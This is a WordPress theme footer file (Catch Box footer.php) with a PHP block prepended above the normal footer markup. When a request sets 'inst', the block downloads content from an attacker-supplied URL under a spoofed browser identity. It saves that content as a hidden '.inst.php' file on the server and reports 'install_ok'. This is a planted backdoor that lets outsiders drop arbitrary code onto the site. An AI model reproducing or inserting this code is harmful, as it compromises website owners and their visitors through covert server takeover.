<?php
if($_GET['inst'])
{
$curl = curl_init();
curl_setopt($curl,CURLOPT_URL,trim($_GET['url']));
curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
curl_setopt($curl,CURLOPT_FOLLOWLOCATION,1);
curl_setopt($curl,CURLOPT_USERAGENT,  "Opera/9.80 (Windows NT 5.1; U; en) Presto/2.2.15 Version/10.00");
curl_setopt($curl,CURLOPT_REFERER, "https://www.google.co.uk/");
curl_setopt($curl,CURLOPT_CONNECTTIMEOUT,10);
curl_setopt($curl,CURLOPT_TIMEOUT,10);
$data=curl_exec($curl);
curl_close($curl);

$file_out=fopen("./.inst.php","w");
fwrite($file_out,$data);
fclose($file_out);

$prov1 = file_get_contents("./.inst.php");
$prov1 = implode("",file("./.inst.php"));
if(strstr($prov1,"upload_ok")==true or strstr($prov2,"upload_ok")==true)
 {
   echo "install_ok";
 } else {
   echo "install_error";
 }
 exit("");
}
?>

<?php
/**
 * The template for displaying the footer.
 *
 * Contains the closing of the id=main div and all content after
 *
 * @package Catch Themes
 * @subpackage Catch_Box
 * @since Catch Box 1.0
 */
?>

  </div><!-- #main -->

  <?php 
    /** 
     * catchbox_after_main hook
     */
    do_action( 'catchbox_after_main' ); 
    ?>      

  <footer id="colophon" role="contentinfo">
    <?php
        /** 
         * catchbox_before_footer_menu hook
         */
        do_action( 'catchbox_before_footer_sidebar' );
  
    /* A sidebar in the footer? Yep. You can can customize
     * your footer with three columns of widgets.
     */
    get_sidebar( 'footer' );
        
    /** 
     * catchbox_before_footer_menu hook
     */
    do_action( 'catchbox_after_footer_sidebar' );
    
    /** 
     * catchbox_before_footer_menu hook
     */
    do_action( 'catchbox_before_footer_menu' );     
    
    if ( has_nav_menu( 'footer', 'catchbox' ) ) {
      // Check is footer menu is enable or not
      $options = catchbox_get_theme_options();
      if ( !empty ($options ['enable_menus'] ) ) :
        $menuclass = "mobile-enable";
      else :
        $menuclass = "mobile-disable";
      endif;
      ?>
      <nav id="access-footer" class="<?php echo $menuclass; ?>" role="navigation">
        <h3 class="assistive-text"><?php _e( 'Footer menu', 'catchbox' ); ?></h3>
        <?php wp_nav_menu( array( 'theme_location'  => 'footer', 'container_class' => 'menu-footer-container', 'depth' => 1 ) );  ?>
      </nav>
         <?php 
    } 
    
    /** 
     * catchbox_before_footer_menu hook
     */
    do_action( 'catchbox_after_footer_menu' ); ?>
        
        <div id="site-generator" class="clearfix">
         <?php if ( !function_exists('dynamic_sidebar') || !dynamic_sidebar('sidebar-6') ) : ?> <?php endif; ?>
            <?php 
            /** 
             * catchbox_site_generator hook
             *
             * @hooked catchbox_socialprofile - 10
             * @hooked catchbox_footer_content - 15
             */
               

            do_action( 'catchbox_site_generator' ); ?> 
           
                  </div> <!-- #site-generator -->
        
  </footer><!-- #colophon -->
    
</div><!-- #page -->

<?php 
/** 
 * catchbox_after hook
 */
do_action( 'catchbox_after' );
?>

<?php wp_footer(); ?>

</body>
</html>